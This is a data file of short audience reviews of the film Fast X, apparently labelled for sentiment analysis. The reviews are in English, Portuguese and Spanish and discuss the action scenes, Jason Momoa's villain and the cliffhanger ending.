"May 21, 2023",NEUTRAL,"Fabulous action scenes and an over the top (in the best way) Jason Mamoa performance, could not help this from being just another entry to a dying franchise. Characters feel more like caricatures of themselves. Most lines feel like they are delivered in the 80’s Stallone/Schwarzenegger style. Then to be cheated out of an ending was disappointing."
"May 21, 2023",POSITIVE,The action was good and how the enemy was a cracked head.  He was psycho! But funny
"May 21, 2023",POSITIVE,It's what you expect and that's all you need to know
"May 21, 2023",NEGATIVE,It was good but the ending was disappointing.
"May 21, 2023",NEUTRAL,All the movies are pretty much the same. It started to feel like it was too much.
"May 21, 2023",NEGATIVE,To many things to list that made this just awful..just put a nail in the coffin already!
"May 21, 2023",POSITIVE,Good show. Jason did a good job playing a deranged villain.
"May 21, 2023",POSITIVE,That's cinema in its purest form
"May 21, 2023",POSITIVE,This one was better than them going to the moon ….lol can’t wait for the next one
"May 21, 2023",POSITIVE,I really liked this movie and I’m looking forward to the last part.  One thing I that would have made the movie better for me is if there had been more if the Shaw character in it.  I’m a fan of Jason Statham.
"May 21, 2023",POSITIVE,"Looking forward to the conclusion.  A little heavy on the special effects, but a great movie."
"May 21, 2023",POSITIVE,Loved the action per usual
"May 21, 2023",NEGATIVE,Storyline. Slow. 35 minutes in thought oh no wonder if I can get my money back.
"May 21, 2023",POSITIVE,at first it was a little slow to me but action packed all the way to the end.
"May 21, 2023",POSITIVE,Will not give any spoilers! It was worth going for me. Enjoyed it!
"May 21, 2023",NEGATIVE,"Before I go on ranting about how awful the story/film was I want to dicuss about the best part, which was the performance of Jason Momoa.

This part is a spoiler, so be warned.

I was expecting a big, strong, kickass character from Jason Momoa, but I got quite the opposite. He was a camp, ballet-dancing, insane psychopath; which is weird, but he made it look awesome.

Now onto how disappointing the movie was.

It felt like they got scenes from Fast 7, 8 and 9 and put them together, there was nothing new, just the same old; we're family, over-the-top CGI and action scenes.

There is one thing; I will have to watch it again when it comes out on FREE streaming because I did fall asleep repetitively and missed quite a lot. Almost every time I opened my eyes I just saw the same long, boring scenes.

Next time I'll watch it with a large jug of coffee to keep me awake."
"May 21, 2023",POSITIVE,"Hated the ending, could've sat through another hour to get more action!
Loved the action and plot twist as always.  I need the next one in the next year! The build-up and ending has me on edge! awesome action and guest appearances 💙💙💙💙"
"May 21, 2023",POSITIVE,Fast X Is A Complete Movie Smart MTV's Awkward. Vs Fast & Furious Car Chases Action Horrors & Slashers Scary Comedy Funny Back In Films Set In The 00s 2000s 10s 2010s 20s 2020s Similar Likes MTV's Awkward. Action-Horror Horror-Action
"May 21, 2023",NEUTRAL,"The script is lazy and predictable, the story has no feet nor a head, the characters didnt catch me emotionally at all, the cliffhanger left me angry and confused and the action sequences are still surreal...i liked it."
"May 21, 2023",NEUTRAL,Fun BUT yikes. The only statement I have to offer.
"May 21, 2023",POSITIVE,CANT WAIT FOR FAST X PT 2🥹
"May 21, 2023",POSITIVE,Finally a bad guy that is threatening! Loved Momoa. the team is in trouble now. cannot wait to see how it resolves
"May 21, 2023",NEGATIVE,The Portuguese was not good they should’ve at least gotten people who spoke it well. Josh Dun and Debby Ryan were great tho.
"May 21, 2023",POSITIVE,"De longe o melhor filme da franquia. Cada luta, detalhe, muito bem feito. A história bem emocionante deixando a gente cheio de ansiedade e agoniado em saber se vai dar tudo certo no final. Perfeito."
"May 21, 2023",POSITIVE,"Great movie what else do you need you got action, cars and family too bad it ends on a cliffhanger"
"May 21, 2023",POSITIVE,"movie was good ,I was surprised what John Cena did ,ending left us into next fast 11"
"May 21, 2023",NEUTRAL,"The dialogue is less than stellar. Characters just pop out of nowhere.
Action scenes are comical. The antagonist is pretty good to balance out the serious serious heroes/sheroes. Major con: The movie is all set up for this long of a movie."
"May 21, 2023",POSITIVE,It's the perfect beginning for the beginning of the end!!!
"May 21, 2023",NEUTRAL,"O filme tem muitas cenas de ação, irá se se divertir com isso, porém as cenas não mostram física nenhuma em certas partes e tem um final que me decepcionou, esse filme consegue ser pior que seu antecessor ""F9""."
"May 21, 2023",POSITIVE,Love the movie action all the way
"May 21, 2023",POSITIVE,Exciting and it kept us in suspense the entire time
"May 21, 2023",NEUTRAL,Way to much CGI and worst ending of them all........
"May 21, 2023",POSITIVE,"Ação de alta qualidade, retorno de personagens importantes e o melhor vilão da franquia. Velozes 10, mantem ação e comedia perfeitamente equilibrado, o que o torna um dos melhores da franquia, alem de ter um vilão hilariante"
"May 21, 2023",POSITIVE,"Cracking Film.  Jason Mamoa is enjoying himself way too much.  Felt a bit rushed towards the end but I'm sure when viewed as the two film
Finale it will make sense.  Love the scenes between John Cena and his nephew.  Gave me some real belly laughs.  Go see it.  Still miss you though Paul.  Hasn't really been the same."
"May 21, 2023",POSITIVE,When will part 2 come our. OMG
"May 21, 2023",POSITIVE,Lots of action and the cast was amazing
"May 21, 2023",NEGATIVE,It was sooooo over the top that it was no longer enjoyable to watch. F&F should go back to basics.
"May 21, 2023",POSITIVE,The best stunts for action movies that have ever been created and look forward to the next sequel as this franchise will never die.
"May 21, 2023",POSITIVE,Good action packed movie with alot of reminders of the past 10 years to the present and it was nice to see most of it for that reason  be sure to stay after the credits
"May 21, 2023",NEUTRAL,Really surprised me on how many characters they could bring back. But what I loved most of all was bringing Shaw back. Even in a dark room Jason Statham's bald head is still shiny as can be. Overall really decent. But 2025 for part 2 needs to come quicker.
"May 21, 2023",POSITIVE,I love it cant wait for 11
"May 21, 2023",POSITIVE,Jason Mamoa steals the show.. Don't like everyone has to wait till 2025 for fast 11.
"May 21, 2023",NEUTRAL,The most over-the-top action you will ever see (not a good thing or bad). I'm trying to wrap my head around what I watched!
"May 21, 2023",POSITIVE,"Though I did expect this film to do things no human can do in the real world, I was still surprised of what I saw in theaters. If it's anything this franchise is good at, it's surprising everyone with the most chaotic stunts imaginable. This was the Infinity War of the Fast & Furious franchise."
"May 21, 2023",POSITIVE,My only regret is the way it ended.
"May 21, 2023",POSITIVE,Amazing! Action packed and I loved the cast! I can't wait for part 2!
"May 21, 2023",POSITIVE,Better than what I thought it was going to be! ACTION PACKED!!!
"May 21, 2023",POSITIVE,It was great until the ending.
"May 21, 2023",NEGATIVE,Waste of money. They need to stop making this movie now! 
"May 21, 2023",POSITIVE,I’m not the biggest fan of the franchise but this is the best one. Reminds me of Lotr meets Batman meets fast & furious.
"May 21, 2023",POSITIVE,Very exciting. Was at the edge of my seat. Can’t wait for the follow up movie!
"May 21, 2023",POSITIVE,Loved it! Jason steals the show! So Fun!
"May 21, 2023",POSITIVE,I enjoyed the movie and I like the car scenes of the fast and furious saga.
"May 21, 2023",POSITIVE,"As a fan, I really loved it. It was fun, funny, and had many nods to my personal favorite film, Fast Five. I really enjoyed the action and cameos, and I cannot wait for the final one. Leterrier’s directing made the action and fighting a bit more engaging. Exciting stuff for fans, but those who are not have some catching up to do before they will enjoy this one."
"May 21, 2023",POSITIVE,A beautiful end to the saga
"May 21, 2023",NEGATIVE,Uninteresting characters with bad dialogue and a boring story
"May 21, 2023",POSITIVE,"Best since 7, awesome stunts and Jason Mamoa is havin' a field day.  Only thing to dislike is having to wait two years for part 2."
"May 21, 2023",NEUTRAL,It was entertaining. Jason Mamoa did a great job introducing a new character. Definitely a lot of action.
"May 21, 2023",POSITIVE,Epic!! I cant wait for the next one!!
"May 21, 2023",POSITIVE,Great movie can’t wait for part two
"May 21, 2023",NEGATIVE,"How do you screw this franchise over this bad? 
Cons:
1. You can predict the script super easy. like 15 minutes ahead.
2. It creates stories about characters that have no previous history. 
3. Not enough Jason Statham in the movie. 
4. SCREW FAST X-2 just end the series NOW.
5. Too much pointless conversation that don't help the development of the movie.

Pros
1. Jason Momoa plays the PERFECT villain. This is his calling as a actor.
2. John Cena actually was fun character in the movie with such small roll-made a big impact.
3. Rock isn't in the movie lol!
4. Alot of @ss hahaha.

Thats pretty much it. I would recommend waiting for its release on Redbox."
"May 21, 2023",POSITIVE,Love this series.  Jason Mamoa was so funny.  Made his villain very funny and likeable.  Action was over the top.
"May 21, 2023",POSITIVE,"Good to see the crew back good chases and effects, well worth the watch"
"May 21, 2023",POSITIVE,I love the movie it's excellent I saw Fast X three times so that will tell you and the actors are very good!!! So people go see the movie!
"May 21, 2023",POSITIVE,So good!!!!!!!!!! made me laugh!!!!
"May 21, 2023",POSITIVE,The action an effects totally on point  Excellent! Loved it
"May 21, 2023",NEGATIVE,Ended on a cliffhanger with all storylines left unresolved. Lots of great action clips but felt like a waste of my time in the end. Plus the post-credits clip was yet another cliffhanger added to an already convoluted story.
"May 21, 2023",POSITIVE,"Liked the movie. Didnt like ending, I know that means theres a part two. Lots of Action."
"May 21, 2023",POSITIVE,Excitement from the beginning to the end a must see!
"May 21, 2023",POSITIVE,The movie is so intense! And I love it! I can watch it over again. Cant wait for the 11 to come
"May 21, 2023",NEGATIVE,It just didnt take the time to build. A lot seem forced or as if I knows what would happen.
"May 21, 2023",NEUTRAL,I was ok less blowing up things and people. More plot of family lives.
"May 21, 2023",POSITIVE,Fast X is way better than Fast 9. There is a few scenes where you think no way they can live through that . But if you turn your mind off and just enjoy the movie. If you're a fan of the series then you will like this !! It end on a big cliffhanger . There is two huge returns at the end !!!
"May 21, 2023",NEGATIVE,"Too long, boring plot and a wide open ending, frustrating!"
"May 21, 2023",POSITIVE,"""Fast X"" comes as a pleasant, fun surprise in a series that has seen some good highs and mediocre lows. The film teeters the perfect line of being just over-the-top to not be too incomprehensible but not too safe of an action film either. Stakes are raised considerably, culminating in a well-done cliffhanger, effectively hanging audiences on the edge of their seats for more. The Fast Saga may not be totally done for after all as the team behind these hyper street racing films have proved that even the most exhaustive franchises can still have hope. And all it takes…is family."
"May 21, 2023",NEUTRAL,"My son said it was 4, hes 9, I think it was 3 and we settled
Story line was convoluted. A lot of moving pieces and and story didnt flow at times. And then Realism!!! From the never ending fire ball, to the throw the son from car scene( like the 4th time its been done getting old) bring the Realism back to the movie"
"May 21, 2023",NEGATIVE,The part that Aquaman play with real corny I didnt like it
"May 21, 2023",POSITIVE,Está mejor que la Sinegrita
"May 21, 2023",NEGATIVE,Absolute garbage way to do the fans at the end. Will be hard pressed to get me in the seat for the second part of that absolute tragedy with no closure. Reasonably good until then. Tanked it with a cliffhanger worse than Halo 5.
"May 21, 2023",POSITIVE,"Action packed, and a very entertaining movie to watch! If you're wanting to bring the movie experience to the next level, highly recommend this movie in D-Box! Brings the all the action to life and one heck of a ride!"
"May 21, 2023",POSITIVE,Loved it!!!!  Keeps elevating the awesomeness.  Looking forward to more!  Never disappointed!
"May 21, 2023",NEUTRAL,"good scenes, but didn't feel like it ever came together as a cohesive movie. I liked the trailers better"
"May 21, 2023",POSITIVE,The movie was awesome a lot of action
"May 21, 2023",NEGATIVE,Its been a good ride but lets put this to rest.. This is like the toxic bf/gf thats still in your life because you cant cut them out thinking things will only get better.
"May 21, 2023",POSITIVE,Incredible from start to finish. Cant wait for Faster X
"May 21, 2023",NEGATIVE,"Disappointed. Yes, it had all the expected car excitement but the ending fell flat on it's face. You already know that when the plane went down they all survived and will miraculously appear in the next sequel. Also, the part where Dom and his son are trapped in the bottom of the dam and it's being blown up is painfully disappointing as a proported ending. They are trying to stretch this franchise out too far."
"May 21, 2023",POSITIVE,Very Well Done Looking Forward to part 2
"May 21, 2023",NEGATIVE,They took the story line of the franchise way too far and way too over board
"May 21, 2023",NEGATIVE,"If the last film jump the shark 🦈 this one went next level. Here is my 60 seconds review 
https://youtube.com/shorts/PireXWUds4Y?feature=share"
"May 21, 2023",POSITIVE,"This movie was action packed and filled with comedy. Jason Momoa's character was well played. Vin Diesel's sympathy and love for his family in this installment was something to be desired. You know what? Just go see the movie, it was awesome! I thoroughly enjoyed this one. All of the installments were amazing but this one is outstanding. What a start to my morning!"
"May 21, 2023",POSITIVE,"I love the cinematography and the action sequences, of course a lot of it is not believable,but to watch it was crazy. Leaving me hanging for part two is the part that I dislike I want to give it four stars but I love the franchise, so five stars it is."
"May 21, 2023",POSITIVE,Great movie! Hate how it ended but definitely looking forward to the next one!
"May 21, 2023",POSITIVE,"Good movie overall, great action scenes and CGI but I personally dislike the cliffhanger ending."
"May 21, 2023",POSITIVE,Best one I seen out of all 10
"May 21, 2023",POSITIVE,The movie is full of action and I can’t wait to see the next part
"May 21, 2023",POSITIVE,With the surprises and Cameos it was a great movie!
"May 21, 2023",POSITIVE,"I liked the action and the characters
 The new characters brought a fresh new style to the movie.It was not cheesy as I expected.  I love the cinematography."
"May 21, 2023",POSITIVE,Another fine entry in the franchise. All always there were some spectacular set pieces. It really does feel like a family at this point. See it!
"May 21, 2023",POSITIVE,"Awesome!  Didn't care as much for the ending but it definitely left it wide open for the next one!!!   Jason Momoa plays an pretty amazing, sick bad guy!!!!  We loved it!!!"
"May 21, 2023",NEGATIVE,"There are movies where you just need to turn your brain off and enjoy it, Fast X is sadly not that case, F9 already felt like they had an empty tank, this movie felt like pushing a car by feet, Jason Momoa was definitely the highlight here."
"May 21, 2023",POSITIVE,Love the movie 🎬  The actors were great can't wait to see what happens next really great movie
"May 21, 2023",NEGATIVE,"Fell asleep in the cinemas, I wasn't the only one. I got woken up by my partner after a nap. Two people on our aisle crashed hard, they didn't wake up, even for the end. I thought the action scenes were cool, but the plot was poor. Too many unbelievable or impossible scenes. Very predictable plot. The franchise has drifted far from the first 5. 
Focused on too much action scenes rather than a plot or character building. Introduced way too many actors. giving 2 stars only for the action scenes.
Jason mamoa was actually decent."
"May 21, 2023",NEUTRAL,Was a great movie but honestly after seeing all the previews with most of the best scenes could have been a bit better.
"May 21, 2023",POSITIVE,"I have always liked how this series has revolved around family and the importance of family. This latest installment is not exception. The action scenes were great! The ending left a lot of unanswered questions that can only be answered with another installment. Overall, it was a good movie."
"May 21, 2023",POSITIVE,Fast 10 was action packed I liked it
"May 21, 2023",NEGATIVE,"What happened to this franchise??  No longer about a car subculture. Now they seem to think they’ve all become some sort of world saving super heroes with unrealistic events and HORRIBLE scripting. All of it comes across forced and cheesy. I’ve tried to stick in there as a huge fan, but I quit!  Walked out of this one. I’m done!"
"May 21, 2023",POSITIVE,I loved the entire movie from beginning to end. Can't wait for part 2!!!!
"May 21, 2023",NEGATIVE,"La película es mala, pero malísima. Teniendo un presupuesto tan alto que no logran hacer efectos especiales decentes, pare que estoy viendo el juego de Asphalt de Gameloft. Ahora, me molesta que me anden reviviendo a personajes que ya murieron. Nunca sientes ese peligro que corren los personajes, porque sabes que no morirán!. iré a ver la XI porque pues ya solo quiero ver en que jalada terminan."
"May 21, 2023",NEGATIVE,"Utter trash. Same concept of resurrection of dead characters, introducing new ones, and killing the present ones. Villains from previous movies become good guys. What is worse is the inconclusive climax with the movie ending abruptly, because the cast is so long, that by the time gal gadot gets a chance to speak, credits start. It just keeps getting worse after every sequel. After tokyo drift they lost the plot."
"May 21, 2023",POSITIVE,"Loved the new Jason Momoa movie. I mean the new Fast & Furious.. 
Jason Momoa gave serious Joker vibes!"
"May 21, 2023",POSITIVE,it was Fabulous! I always looked forward to Fast and Furious Movies! The Actors are Great! Sure enjoyed the movie!
"May 21, 2023",NEUTRAL,"""Fast X"" continues the trend of the last few movies by being so self-aware that it comes off as kind of dumb. I think there is some fun to be had for franchise fans here, but the silliness of this current era of movies is getting a bit out of hand. I actually have no issue that the movies are implausible or ridiculous and still have a blast with the action scenes. I think the issue with the movies nowadays is that the storylines are kind of stale and they try too hard to involve every single character that has ever existed in the series. I think the best part of this movie is Jason Momoa and he's really the only part I liked more than the 9th one. I still feel that this movie and the last one are the worst in the franchise. All that being said, the movie is dumb, but at the same time, it's fun. I saw this movie with friends like I did the last time around and we laughed and embraced the ridiculous nature of the movie. Overall, I am curious about what they end up doing with this final trilogy, but some major changes need to be made or this franchise is going to wrap up on a low note."
"May 21, 2023",POSITIVE,"Fast X was pretty darn good, but it is just a movie that continues to lose track of its roots and goes into an anime-centric vibe. However, this series is just stupid fun, pure popcorn lunacy with lots of stunts and CGI to get lost in. The film plays well with the characters, adds those special moments that ignite the theater experience, and keeps it at a pace much like Dom's car, fast, powerful, and somehow resistant. Yet, the movie has a fractured plot and continues to draw out stories and tries to suspend predictability which is not working when there is no commitment. The series is reaching soap opera levels, and this film did cram a lot of stuff, with action that sometimes felt a bit forced. Is it terrible? Absolutely not, but this movie is not standing on its own and is leaning heavily toward the next movie."
"May 21, 2023",POSITIVE,The surprises at the end of the movie. I thought this would be the end of the franchise!
"May 21, 2023",POSITIVE,"This movie was amazingly created and I have not seen it 3x in the Cinema. Only thing is I miss the Rocks presence in the film and need more John Cena and Jason Statham !!!

I love the twists of Jason Momoa and don't want to have to wait 2 years for next one !!"
"May 21, 2023",NEGATIVE,The trouble with Fast X is that it’s marred by the fact that (at the moment) it’s two part film. The action is wildly beyond on point for the franchise when it takes place but is held down by the setup of the inevitable sequel to come. 
"May 21, 2023",POSITIVE,Awesome movie! They definitely do it for thr fans. Each movir gets better and better! Jason Mamoa was hysterical! Can't eait for the next one!
"May 21, 2023",NEGATIVE,This is a child’s movie
"May 21, 2023",POSITIVE,"Exciting, action , great stunts"
"May 21, 2023",POSITIVE,Awesome movie ready for Fast 11
"May 21, 2023",POSITIVE,Entertaining action from start to finish! Great excution of the plot with smooth twist and turns. Even the dumb sh..t fit to move individual and ensemble performance. Jason Momoa....FANTASTIC antagonist...he drop the  hammer and the mic from first to last scene. I'm looking forward to the sequel... There is so much more unpacking to do!
"May 21, 2023",POSITIVE,Have been a fan of Fast and Furious  since it first came out. I thought the movie was AWESOME!!
"May 21, 2023",POSITIVE,Thrilling and action packet.. cant wait for part 2
"May 21, 2023",NEUTRAL,praying they don’t overplay this sequel of movies.
"May 21, 2023",NEUTRAL,"A queda na qualidade começou em Velozes e Furiosos 5, quando dois carros conseguiram arrastar um cofre cheio de dinheiro, mas, no final, apenas um carro com nitro conseguiu essa proeza. A partir daí, todos os filmes ignoraram completamente a física e a lógica, porém, isso não os tornou ruins.

Atualmente, Velozes e Furiosos se transformou em uma mistura de Vingadores com Dragon Ball. Nenhum dos personagens principais realmente morre; eles apenas desaparecem por alguns filmes e depois voltam à vida.

Além disso, fiquei em dúvida sobre o que aconteceu com o filho de Dom. É impossível que ninguém do estúdio tenha percebido que o garoto muda completamente a cada filme. Ele é filho de uma brasileira branca e loira, assim como Dom, que também é branco. Por mais latinos que ambos sejam, como é possível que o garoto seja branco no oitavo filme, ruivo no nono e negro no décimo? Será que foi o bronzeado ao qual Roman se referiu no quinto filme da saga?

Agora, outro detalhe que surge no nono filme é o irmão de Dom, alguém que ele nunca mencionou nos filmes anteriores. De repente, o irmão aparece no nono filme e se sacrifica no décimo?

A saga se tornou uma novela, mas continuo assistindo porque sempre fui fã. No entanto, o nível caiu muito, assim como aconteceu com a maioria dos filmes de Hollywood. A melhor parte do filme foi a tradicional corrida de rua. Acredito que deveriam encerrar a saga e focar em spin-offs com outros personagens, um filme apenas com o Roman seria excelente.

Ps: O Jason Momoa ficou foda como vilão"
"May 21, 2023",POSITIVE,Loved it they always do better
"May 21, 2023",POSITIVE,Good movie especially side effects screen x
"May 21, 2023",POSITIVE,It was really good especially the cliff hanger they left us on
"May 21, 2023",POSITIVE,"The best since 7, Fast X is the ultimate popcorn flick."
"May 21, 2023",POSITIVE,"Great action, left a little on continuation."
"May 21, 2023",POSITIVE,"Absolutely loved it! As I felt F9 was just mediocre for me, I definitely found Fast X to be 10 times redeeming from it. This movie was a hands down thrill ride, pumped full of the ridiculous action the franchise is known for. The movie is almost 2.5hrs long but it keeps you so hooked it feels like it's only an hour long. Jason Momoa does a phenomenal job at playing a wild, psychotic madman of a villain. Fast X instantly became my new 2nd favorite movie of the franchise! It ends with a sudden cliffhanger that's gonna leave you hanging there for the next 2yrs until the next one. Ugh!"
"May 21, 2023",POSITIVE,Action packed as always! Just what you would expect from a  fast & Furious series movie! Vin Diesels still got it! They set us up for another one!
"May 21, 2023",NEUTRAL,I love the movie but the ending is incomplete !!! I don't know what directors were thinking but ending of the sucked.
"May 21, 2023",POSITIVE,"Loved how Jason Momoa played his part as the villain...great interpretation of split personality.  Momma Rita Moreno was the right person to play the mother of a tough family. John Cena (Jakob) returning to family was... Priceless.  Little B, Leo Abelo breaks in with depths of acting proving he too is worthy of being a Fast X regular. No words can describe the regular cast of Fast X.  Action Humor Drama Love They give it to you.
Go See It!"
"May 21, 2023",NEGATIVE,"It's the worst film I've ever seen! Acting by everyone was so so cheesy and terrible, lol! To be honest, the last three have been a painful watch but this one, JEEEZ.... All in all; the Fast and Furious franchise has lost the plot! No more!"
"May 21, 2023",POSITIVE,"Again I'm left up in the air.  Great action packed , typical Fast and Furious franchise rhythm and fun. Will there be another one?????"
"May 21, 2023",POSITIVE,Great action!!!! Loved it!
"May 21, 2023",POSITIVE,i like everything about the movie cant wait to see part 11
"May 21, 2023",POSITIVE,The whole movie was amazing and the ending was crazy
"May 21, 2023",POSITIVE,"as a non-fan I couldn't prove myself, here you have been well entertained and Jason Momoa so exaggerated and yet so entertaining"
"May 21, 2023",POSITIVE,loved all the non stop action love the characters
"May 21, 2023",POSITIVE,It had me on my seat at all times. The race was phenomenal
"May 21, 2023",POSITIVE,Accin pack non stop.  Great actors.. I loved it!!
"May 21, 2023",NEGATIVE,Probably one of the worst movies I've seen in a long time.  There was ADD everywhere jumping from scene to scene and plots that never finished.
"May 21, 2023",NEUTRAL,"Typical fast cars, special effects, implausible stunts and scenarios but still kind of fun. A little too long. The story line and script are not strong points. Wish my truck was indestructible like the ones on screen."
"May 21, 2023",POSITIVE,This movie was a little unrealistic and the ending wasn't really an ending. It should have been promoted as part 1 of a series. Was fast moving and entertaining for a weekend break.
"May 21, 2023",NEGATIVE,Good action sometimes... a lot of dry parts an unrealistic story changes the villian was ok.. kinda fruity role though.
"May 21, 2023",NEGATIVE,The worst movie ever seen in my life
"May 21, 2023",POSITIVE,"Love the movie , I hope this really isnt the end because we dont know what happen to all of the characters"
"May 21, 2023",POSITIVE,Mind blowing & O.M.G Can't wait to for part 2. Missing Brian aka Paul Walker
"May 21, 2023",NEGATIVE,The dumbing down of the human species continues. 
"May 21, 2023",POSITIVE,One of the best fast and the furious movies! Loved it.
"May 21, 2023",POSITIVE,Enjoyed it and yet I did have some tears along the way!
"May 21, 2023",NEUTRAL,"Two hours twenty minutes and still we didn't know the end.
Wait for the second part"
"May 21, 2023",POSITIVE,"I tied up alot about the series and brought everyone back.
Just wish they would have tied up Brian's story instead of saying that he was just home with the kids and let Mia get involved. Brian wouldn't have done that. Disappointed in that story line. 
Also not happy with leaving us hang about what happened with Dom and his son. Did they escape the dam breaking?"
"May 21, 2023",POSITIVE,great movie.lots of action and suspense.. even some touching and funny parts.
"May 21, 2023",POSITIVE,At times it was so much being revealed it got confusing for those who didnt remember all the previous ones. But Jason Mamoa took the movie to another level with his acting!! We loved his weird character!! So much amazing action !!
"May 21, 2023",POSITIVE,It was action packed full of suspense
"May 21, 2023",POSITIVE,Didn't like how it just ended and got you waiting on next one
"May 21, 2023",POSITIVE,loved all the action and all the new characters fit in really good. Jason Mamoa played a great bad guy.
"May 21, 2023",NEGATIVE,Not impressed with this movie. My husband is a huge fan we have seen and own every Fast and furious and sad to say we walked out of the movie and my husband sadly said .. we wont be buying that one
"May 21, 2023",POSITIVE,"This movie was a hit, the first scene was absolutely insane! I had never seen any of the fast and furious movies prior to going and seeing this one yesterday, and I would 100 and 10% go buy a ticket for it again. The main antagonist in this film is very odd and particular, though, which was the only thing that I disliked from this movie. Overall it was a great film."
"May 21, 2023",NEUTRAL,"An improvement on nine but suffers from being a setup for the next film.  The cast continues to have fun, though is a bit overstuffed at times, resulting in the film's length.  Thankfully, the saving grace is Jason Momoa, playing the main villain, Dante, who is as crazy and evil as they come.  Whether talking to dead bodies or wearing outrageous outfits, Momoa makes one of the best villains in the franchise.  Behind the camera, director Louis Leterrier delivers a fast paced and action packed movie, though as usual the story is nonsensical.  However, things are made worse as the film is a setup for the next one, as characters and stories show up but then aren't resolved, leading to the film ending in a huge cliffhanger.  Overall, fun for fans but not the best in the franchise."
"May 21, 2023",POSITIVE,Unbelievable action. Jason Mamoa is Very entertaining he's both crazy and evil at the same time The rest of the family is quite amazing in their love and their bickering back and forth It really is a great show you can pick it up from that episode and never know about all the other ones.
"May 21, 2023",NEGATIVE,Am I the only one who thinks jason Momoa is a horrible actor?
"May 21, 2023",POSITIVE,Best movie so far in 2023 the ending was stupid though
"May 21, 2023",POSITIVE,"Great action packed movie that keeps you on the edge of your seat. Make sure you have enough popcorn and other goodies for this long movie, you don't want to miss a single minute! I am looking forward to the next episode ""Fast XI""."
"May 21, 2023",POSITIVE,"Great movie, great cast. They have truly stuck to the formula that has made this franchise such a success. Superman has his cape, Batman has his gadgets, but Dom Toretto has his car. Awesome action scenes, some seem a bit far fetched but its all for entertainment."
"May 21, 2023",NEGATIVE,"Movie is I think worst I have seen, look no hate towards any actor but the scenes which had vin disel in it were the worst, but the cameos were great BGM and music were some good points and yes the ending was kind of mediocre cliffhanger."
"May 21, 2023",POSITIVE,So much ACTIONI would watch it again and again.. really action filledmaybe the best of all
"May 21, 2023",POSITIVE,Same plot line. Explosions everywhere. Jason Mamoa as a crazy psychopath was fantastic. John Cena as the weird brother was just as great. Need a new story line though. Ended on a cliff jumper.
"May 21, 2023",POSITIVE,"It was great, action packed, and full of adventure."
"May 21, 2023",POSITIVE,Lots of action. You will be at the edge of your seat. Will leave you wondering what is going to happen next.
"May 21, 2023",NEGATIVE,"This is a parody, right? Made by people with the mind of a hyperactive 10 year old for people with, oh screw it, you get the picture. I was led to believe that this dreck was at least self-aware dreck, and to a very small degree it is, but it also wants us to take it more seriously than warranted. If Fast X wants to be utterly absurd let it be, but don't expect me to give a damn about ""family"", or is that a joke too?"
"May 21, 2023",NEGATIVE,"A true stinker...Hard to keep up with...Women somehow turn into John Wick...Subpar Acting...Snoozefest, I fell asleep twice...Don't watch if you actually like a enjoyable movie"
"May 21, 2023",POSITIVE,Loved it was excellent
"May 21, 2023",POSITIVE,Minha única raiva do filme é por que ele acaba!
"May 21, 2023",POSITIVE,It's absolutely awesome! I loveeed every bit of it. MusT see
"May 21, 2023",POSITIVE,Fast X kept me on edge the whole entire movie only ending with major twists and cliffhanger. Absolutely must see.
"May 21, 2023",POSITIVE,I didnt like that they didnt show what happened to Dom and his son when the damn was about to explode are you heard was the beep to the alarm like a flatline sound then they didnt show what happened to Rome tes and Ramsey when the plane crashed alot of un told stories left behind jazzy is alive they didnt show what happened to her or the rock shows up like what happened to him great movies but not so good with untold stories
"May 21, 2023",NEGATIVE,"The plot was rushed. Realism was non existent.  The film is too concerned with blowing stuff up and long drawn out chases as opposed to its initial roots, which made the franchise popular."
"May 21, 2023",POSITIVE,I actually thought it was a pretty solid addition to the long running franchise. Story was decent. Action packed. Comedic moments and most of all Family driven. Not better or worse than the other films but I definitely want to see what happens next.
"May 21, 2023",POSITIVE,"Funnny, Entertaining.."
"May 21, 2023",POSITIVE,We loves this one. Jason Mamoa excelled in this role. Can't wait to see the next one.
"May 21, 2023",POSITIVE,"If you are fast and furious fan, definitely something you should not missed."
"May 21, 2023",NEGATIVE,"I really don't get it. I truly don't. They have gone the sharknado, never go full sharknado. The movie was just horrible. Do you remember the movie the other guys? Remember aim for the bushes? Every freaking action scene in this movie should have ended like that, yet they will make you believe like they actually made it. 

The first 30 minutes are boring as hell and every other word is ""family"" followed by vin starring a pictures and making cheesy faces, followed by a family bbq and more family and photo collages. Also let's talk about ""legacy"" 20 more times. I don't think everyone sitting in the theater noticed the same word being used over and over again. 

The laws of physics don't apply to this movie and haven't really since fast 5 which this movie is based on. You thought a safe being pulled by two cars was silly enough, well just wait to see the helicopter nunchucks. 

I like Jason Mamoa a lot but I didn't care for his villain much although it seems like he had a lot of fun filming that role. His character was the only one that had ""life"", everyone else was predictable. 

I honestly just couldn't wait for the movie to end and then it end and then it suddenly did. Some call it a cliff hanger I call it a blessing because that movie had no direction. I watched the movie with a group of friends that have watched everything single movie and their reaction was ""yeah that was awful and I'll never be able to get those two hours of my life"""
"May 21, 2023",POSITIVE,Good story encompassing all the previous storylines.
"May 21, 2023",NEGATIVE,"A lot of ""filler"" scene's, useless new character's, bad script... worse part of Fast Saga"
"May 21, 2023",NEGATIVE,Lots of action as you would expect from a fast movie but a bit too farfetched. Too much Hollywood explosions and not enough good acting for my liking.
"May 21, 2023",POSITIVE,"LOVED IT. SAD, BUT WORTH IIT! 🍿🍿🍿🍿🍿"
"May 21, 2023",POSITIVE,"As an action flick, I'm giving this film a high rating. The car chases, the shootouts, and fist fights are totally outrageous, typical for this franchise, and quite enjoyable. Now, as for the story. Well, the plot has big enough holes to drive a Mack Truck through but what it lacks in coherency more than makes up in eye-popping action scenes."
"May 21, 2023",NEGATIVE,Jason Mamoa was great. The movie was not.
"May 21, 2023",NEGATIVE,"The film's ok. Not good but ok. The film felt half baked with plot inconsistencies like a neutron bomb not nuking Rome, a random fight scene between two characters helping each other that comes out of nowhere, Star Wars level of sci-fi technology. It feels like the whole movie was made to reference the whole ""family"" meme that went around and it shows. The villains constantly poke fun of the ""family"" idea whilst killing off a tone of characters and it feels more meta than thriller. The main villain played by Jason Momoa feels more like a Batman villain constantly cracking jokes and even doing some of the things seen in batman films like the riddlers ""chose"" dilemma. Overall this film feels like it's having an identity crisis not knowing if it's a thriller with car chases, a sci-fi film or a detective comic film."
"May 21, 2023",POSITIVE,Very good. Loved Jason Mamoa and his flamboyant style with sadistic tendencies made for a villain you cant stop watching. The whole movie was a good ride. Cant wait to see how it ends.
"May 21, 2023",POSITIVE,I love the movie it was amazing
"May 21, 2023",POSITIVE,A very good movie. A must see.
"May 21, 2023",POSITIVE,"The movie was full of action , and the best way to watch it in 4DX . I was not disappointed , can't wait for number 11."
